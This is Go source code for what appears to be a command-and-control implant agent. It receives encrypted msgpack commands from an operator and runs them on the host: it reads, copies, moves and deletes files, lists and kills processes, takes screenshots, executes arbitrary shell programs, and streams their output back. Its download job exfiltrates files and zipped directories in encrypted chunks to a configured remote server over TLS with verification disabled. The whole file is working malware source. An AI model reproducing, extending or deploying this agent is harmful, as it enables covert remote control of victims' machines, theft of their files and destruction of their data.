package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/shirou/gopsutil/v4/process"
	"github.com/vmihailenco/msgpack/v5"
	"gopher/functions"
	"net"
	"os"
	"os/exec"
	"os/user"
	"sync"
	"syscall"
	"time"
)

var UPLOADS map[string][]byte
var DOWNLOADS map[string]Connection
var JOBS map[string]Connection

func TaskProcess(commands [][]byte) [][]byte {
	var (
		command Command
		data    []byte
		result  [][]byte
		err     error
	)

	for _, cmdBytes := range commands {
		err = msgpack.Unmarshal(cmdBytes, &command)
		if err != nil {
			continue
		}

		switch command.Code {

		case COMMAND_DOWNLOAD:
			data, err = jobDownloadStart(command.Data)

		case COMMAND_CAT:
			data, err = taskCat(command.Data)

		case COMMAND_CD:
			data, err = taskCd(command.Data)

		case COMMAND_CP:
			data, err = taskCp(command.Data)

		case COMMAND_EXIT:
			data, err = taskExit()

		case COMMAND_JOB_LIST:
			data, err = taskJobList()

		case COMMAND_JOB_KILL:
			data, err = taskJobKill(command.Data)

		case COMMAND_KILL:
			data, err = taskKill(command.Data)

		case COMMAND_LS:
			data, err = taskLs(command.Data)

		case COMMAND_MKDIR:
			data, err = taskMkdir(command.Data)

		case COMMAND_MV:
			data, err = taskMv(command.Data)

		case COMMAND_PS:
			data, err = taskPs()

		case COMMAND_PWD:
			data, err = taskPwd()

		case COMMAND_SCREENSHOT:
			data, err = taskScreenshot()

		case COMMAND_RM:
			data, err = taskRm(command.Data)

		case COMMAND_RUN:
			data, err = jobRun(command.Data)

		case COMMAND_SHELL:
			data, err = taskShell(command.Data)

		case COMMAND_UPLOAD:
			data, err = taskUpload(command.Data)

		case COMMAND_ZIP:
			data, err = taskZip(command.Data)

		default:
			continue
		}

		if err != nil {
			command.Code = COMMAND_ERROR
			command.Data, _ = msgpack.Marshal(AnsError{Error: err.Error()})
		} else {
			command.Data = data
		}

		packerData, _ := msgpack.Marshal(command)
		result = append(result, packerData)
	}

	return result
}

/// TASKS

func taskCat(paramsData []byte) ([]byte, error) {
	var params ParamsCat
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(AnsCat{Path: params.Path, Content: content})
}

func taskCd(paramsData []byte) ([]byte, error) {
	var params ParamsCd
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	err = os.Chdir(path)
	if err != nil {
		return nil, err
	}

	newPath, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(AnsPwd{Path: newPath})
}

func taskCp(paramsData []byte) ([]byte, error) {
	var params ParamsCp
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	if info.IsDir() {
		err = functions.CopyDir(srcPath, dstPath)
	} else {
		err = functions.CopyFile(srcPath, dstPath, info)
	}

	return nil, err
}

func taskExit() ([]byte, error) {
	ACTIVE = false
	return nil, nil
}

func taskJobList() ([]byte, error) {

	var jobList []JobInfo
	for k, v := range DOWNLOADS {
		jobList = append(jobList, JobInfo{JobId: k, JobType: v.packType})
	}
	for k, v := range JOBS {
		jobList = append(jobList, JobInfo{JobId: k, JobType: v.packType})
	}

	list, _ := msgpack.Marshal(jobList)

	return msgpack.Marshal(AnsJobList{List: list})
}

func taskJobKill(paramsData []byte) ([]byte, error) {
	var params ParamsJobKill
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	job, ok := DOWNLOADS[params.Id]
	if !ok {
		job, ok = JOBS[params.Id]
		if !ok {
			return nil, fmt.Errorf("job '%s' not found", params.Id)
		}
	}

	if job.jobCancel != nil {
		job.jobCancel()
	}

	job.handleCancel()

	return nil, nil
}

func taskKill(paramsData []byte) ([]byte, error) {
	var params ParamsKill
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	proc, err := os.FindProcess(params.Pid)
	if err != nil {
		return nil, err
	}

	err = proc.Signal(syscall.SIGKILL)
	return nil, err
}

func taskLs(paramsData []byte) ([]byte, error) {
	var params ParamsLs
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		return msgpack.Marshal(AnsLs{Result: false, Status: err.Error(), Path: path, Files: nil})
	}

	var Files []FileInfo
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			return msgpack.Marshal(AnsLs{Result: false, Status: err.Error(), Path: path, Files: nil})
		}

		nlink := uint64(1)
		uid := 0
		gid := 0
		stat, ok := info.Sys().(*syscall.Stat_t)
		if ok {
			nlink = uint64(stat.Nlink)
			uid = int(stat.Uid)
			gid = int(stat.Gid)
		}

		username := fmt.Sprintf("%d", uid)
		u, err := user.LookupId(username)
		if err == nil {
			username = u.Username
		}

		group := fmt.Sprintf("%d", gid)
		g, err := user.LookupGroupId(group)
		if err == nil {
			group = g.Name
		}

		fileInfo := FileInfo{
			Mode:     info.Mode().String(),
			Nlink:    int(nlink),
			User:     username,
			Group:    group,
			Size:     info.Size(),
			Date:     info.ModTime().Format("Jan _2 15:04"),
			Filename: entry.Name(),
			IsDir:    info.IsDir(),
		}
		Files = append(Files, fileInfo)
	}

	filesData, _ := msgpack.Marshal(Files)

	return msgpack.Marshal(AnsLs{Result: true, Path: path, Files: filesData})
}

func taskMkdir(paramsData []byte) ([]byte, error) {
	var params ParamsMkdir
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	mode := os.FileMode(0755)
	err = os.MkdirAll(path, mode)

	return nil, err
}

func taskMv(paramsData []byte) ([]byte, error) {
	var params ParamsMv
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	err = os.Rename(srcPath, dstPath)
	if err == nil {
		return nil, nil
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	if info.IsDir() {
		err = functions.CopyDir(srcPath, dstPath)
		if err == nil {
			_ = os.RemoveAll(srcPath)
		}
	} else {
		err = functions.CopyFile(srcPath, dstPath, info)
		if err == nil {
			_ = os.Remove(srcPath)
		}
	}
	return nil, err
}

func taskPs() ([]byte, error) {
	procs, err := process.Processes()
	if err != nil {
		return nil, err
	}

	var Processes []PsInfo
	for _, p := range procs {

		ppid, err := p.Ppid()
		if err != nil {
			ppid = 0
		}

		username, err := p.Username()
		if err != nil {
			username = ""
		}

		tty, err := p.Terminal()

		cmdline, err := p.Cmdline()
		if err != nil || cmdline == "" {
			cmdline, _ = p.Name()
		}

		psInfo := PsInfo{
			Pid:     int(p.Pid),
			Ppid:    int(ppid),
			Context: username,
			Tty:     tty,
			Process: cmdline,
		}
		Processes = append(Processes, psInfo)
	}

	processesData, _ := msgpack.Marshal(Processes)

	return msgpack.Marshal(AnsPs{Result: true, Processes: processesData})
}

func taskPwd() ([]byte, error) {
	path, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(AnsPwd{Path: path})
}

func taskRm(paramsData []byte) ([]byte, error) {
	var params ParamsRm
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if info.IsDir() {
		err = os.RemoveAll(path)
	} else {
		err = os.Remove(path)
	}
	return nil, err
}

func taskScreenshot() ([]byte, error) {
	screenshot, err := functions.Screenshots()
	if err != nil {
		return nil, err
	}

	screens := make([][]byte, 0)
	for _, pic := range screenshot {
		screens = append(screens, pic)
	}

	return msgpack.Marshal(AnsScreenshots{Screens: screens})
}

func taskShell(paramsData []byte) ([]byte, error) {
	var params ParamsShell
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	cmd := exec.Command(params.Program, params.Args...)
	output, _ := cmd.CombinedOutput()

	return msgpack.Marshal(AnsShell{Output: string(output)})
}

func taskUpload(paramsData []byte) ([]byte, error) {
	var params ParamsUpload
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	uploadBytes, ok := UPLOADS[path]
	if !ok {
		uploadBytes = params.Content
	} else {
		delete(UPLOADS, path)
		uploadBytes = append(uploadBytes, params.Content...)
	}

	if params.Finish {
		files, err := functions.UnzipBytes(uploadBytes)
		if err != nil {
			return nil, err
		}

		content, ok := files[params.Path]
		if !ok {
			return nil, errors.New("file not uploaded")
		}

		err = os.WriteFile(path, content, 0644)
		if err != nil {
			return nil, err
		}

	} else {
		UPLOADS[path] = uploadBytes
		return nil, nil
	}

	return msgpack.Marshal(AnsUpload{Path: path})
}

func taskZip(paramsData []byte) ([]byte, error) {
	var params ParamsZip
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	var content []byte
	if info.IsDir() {
		content, err = functions.ZipDirectory(srcPath)
	} else {
		content, err = functions.ZipFile(srcPath)
	}
	if err != nil {
		return nil, err
	}

	err = os.WriteFile(dstPath, content, 0644)
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(AnsZip{Path: dstPath})
}

/// JOBS

func jobDownloadStart(paramsData []byte) ([]byte, error) {
	var params ParamsDownload
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}

	var content []byte
	if info.IsDir() {
		content, err = functions.ZipDirectory(path)
		path += ".zip"
	} else {
		content, err = os.ReadFile(path)
	}
	if err != nil {
		return nil, err
	}

	var conn net.Conn
	if profile.UseSSL {
		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
		if certerr != nil {
			return nil, err
		}

		caCertPool := x509.NewCertPool()
		caCertPool.AppendCertsFromPEM(profile.CaCert)

		config := &tls.Config{
			Certificates:       []tls.Certificate{cert},
			RootCAs:            caCertPool,
			InsecureSkipVerify: true,
		}
		conn, err = tls.Dial("tcp", profile.Addresses[0], config)

	} else {
		conn, err = net.Dial("tcp", profile.Addresses[0])
	}
	if err != nil {
		return nil, err
	}

	r := make([]byte, 4)
	_, _ = rand.Read(r)
	FileId := binary.BigEndian.Uint32(r)

	connection := Connection{
		packType: EXFIL_PACK,
		conn:     conn,
	}
	connection.ctx, connection.handleCancel = context.WithCancel(context.Background())
	DOWNLOADS[fmt.Sprintf("%08x", int(FileId))] = connection

	go func() {
		defer func() {
			connection.handleCancel()
			_ = conn.Close()
			delete(DOWNLOADS, fmt.Sprintf("%08x", int(FileId)))
		}()

		exfilPack, _ := msgpack.Marshal(ExfilPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
		exfilMsg, _ := msgpack.Marshal(StartMsg{Type: EXFIL_PACK, Data: exfilPack})
		exfilMsg, _ = EncryptData(exfilMsg, encKey)

		job := Job{
			CommandId: COMMAND_DOWNLOAD,
			JobId:     params.Task,
		}

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := connRead(conn, profile.BannerSize)
			if err != nil {
				return
			}
		}

		/// Send Init
		sendMsg(conn, exfilMsg)

		chunkSize := 10
		totalSize := len(content)
		for i := 0; i < totalSize; i += chunkSize {

			end := i + chunkSize
			if end > totalSize {
				end = totalSize
			}
			start := i == 0
			finish := end == totalSize

			canceled := false

			select {
			case <-connection.ctx.Done():
				finish = true
				canceled = true
			default:
				// Continue
			}

			job.Data, _ = msgpack.Marshal(AnsDownload{FileId: int(FileId), Path: path, Content: content[i:end], Size: len(content), Start: start, Finish: finish, Canceled: canceled})
			packedJob, _ := msgpack.Marshal(job)

			message := Message{
				Type:   2,
				Object: [][]byte{packedJob},
			}

			sendData, _ := msgpack.Marshal(message)
			sendData, _ = EncryptData(sendData, sKey)
			sendMsg(conn, sendData)

			if finish {
				break
			}
			time.Sleep(time.Millisecond * 100)
		}
	}()

	return nil, nil
}

func jobRun(paramsData []byte) ([]byte, error) {
	var params ParamsRun
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	procCtx, procCancel := context.WithCancel(context.Background())
	cmd := exec.CommandContext(procCtx, params.Program, params.Args...)
	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("stdout pipe error: %w", err)
	}
	stderrPipe, err := cmd.StderrPipe()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("stderr pipe error: %w", err)
	}

	var stdoutMu sync.Mutex
	var stderrMu sync.Mutex
	stdoutBuf := new(bytes.Buffer)
	stderrBuf := new(bytes.Buffer)
	stdoutScanner := bufio.NewScanner(stdoutPipe)
	stderrScanner := bufio.NewScanner(stderrPipe)

	err = cmd.Start()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("start error: %w", err)
	}
	pid := 0
	if cmd.Process != nil {
		pid = cmd.Process.Pid
	}

	var conn net.Conn
	if profile.UseSSL {
		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
		if certerr != nil {
			procCancel()
			return nil, err
		}

		caCertPool := x509.NewCertPool()
		caCertPool.AppendCertsFromPEM(profile.CaCert)

		config := &tls.Config{
			Certificates:       []tls.Certificate{cert},
			RootCAs:            caCertPool,
			InsecureSkipVerify: true,
		}
		conn, err = tls.Dial("tcp", profile.Addresses[0], config)

	} else {
		conn, err = net.Dial("tcp", profile.Addresses[0])
	}
	if err != nil {
		procCancel()
		return nil, err
	}

	connection := Connection{
		packType:  JOB_PACK,
		conn:      conn,
		jobCancel: procCancel,
	}
	connection.ctx, connection.handleCancel = context.WithCancel(context.Background())
	JOBS[params.Task] = connection

	go func() {
		defer func() {
			procCancel()
			connection.handleCancel()
			_ = conn.Close()
			delete(JOBS, params.Task)
		}()

		jobPack, _ := msgpack.Marshal(JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
		jobMsg, _ := msgpack.Marshal(StartMsg{Type: JOB_PACK, Data: jobPack})
		jobMsg, _ = EncryptData(jobMsg, encKey)

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := connRead(conn, profile.BannerSize)
			if err != nil {
				return
			}
		}

		/// Send Init
		sendMsg(conn, jobMsg)

		job := Job{
			CommandId: COMMAND_RUN,
			JobId:     params.Task,
		}

		job.Data, _ = msgpack.Marshal(AnsRun{Pid: pid, Start: true})
		packedJob, _ := msgpack.Marshal(job)

		message := Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}

		sendData, _ := msgpack.Marshal(message)
		sendData, _ = EncryptData(sendData, sKey)
		sendMsg(conn, sendData)

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			for stdoutScanner.Scan() {
				stdoutMu.Lock()
				stdoutBuf.WriteString(stdoutScanner.Text() + "\n")
				stdoutMu.Unlock()
			}
		}()
		go func() {
			defer wg.Done()
			for stderrScanner.Scan() {
				stderrMu.Lock()
				stderrBuf.WriteString(stderrScanner.Text() + "\n")
				stderrMu.Unlock()
			}
		}()

		done := make(chan struct{})
		var lastOutLen, lastErrLen int
		go func() {
			ticker := time.NewTicker(5 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-done:
					return
				case <-ticker.C:

					ansRun := AnsRun{Pid: pid}

					stdoutMu.Lock()
					out := stdoutBuf.String()
					stdoutMu.Unlock()
					if len(out) > lastOutLen {
						ansRun.Stdout = out[lastOutLen:]
						lastOutLen = len(out)
					}

					stderrMu.Lock()
					errOut := stderrBuf.String()
					stderrMu.Unlock()
					if len(errOut) > lastErrLen {
						ansRun.Stderr = errOut[lastErrLen:]
						lastErrLen = len(errOut)
					}

					if len(ansRun.Stdout) > 0 || len(ansRun.Stderr) > 0 {
						job.Data, _ = msgpack.Marshal(ansRun)
						packedJob, _ := msgpack.Marshal(job)

						message := Message{
							Type:   2,
							Object: [][]byte{packedJob},
						}

						sendData, _ := msgpack.Marshal(message)
						sendData, _ = EncryptData(sendData, sKey)
						sendMsg(conn, sendData)
					}
				}
			}
		}()

		time.Sleep(200 * time.Millisecond)
		err = cmd.Wait()
		wg.Wait()
		close(done)

		ansRun := AnsRun{Pid: pid}
		if out := stdoutBuf.String(); len(out) > lastOutLen {
			ansRun.Stdout = out[lastOutLen:]
		}
		if errOut := stderrBuf.String(); len(errOut) > lastErrLen {
			ansRun.Stderr = errOut[lastErrLen:]
		}
		job.Data, _ = msgpack.Marshal(ansRun)
		packedJob, _ = msgpack.Marshal(job)
		message = Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}
		sendData, _ = msgpack.Marshal(message)
		sendData, _ = EncryptData(sendData, sKey)
		sendMsg(conn, sendData)

		/// FINISH

		job.Data, _ = msgpack.Marshal(AnsRun{Pid: pid, Finish: true})
		packedJob, _ = msgpack.Marshal(job)

		message = Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}

		sendData, _ = msgpack.Marshal(message)
		sendData, _ = EncryptData(sendData, sKey)
		sendMsg(conn, sendData)
	}()

	return nil, nil
}
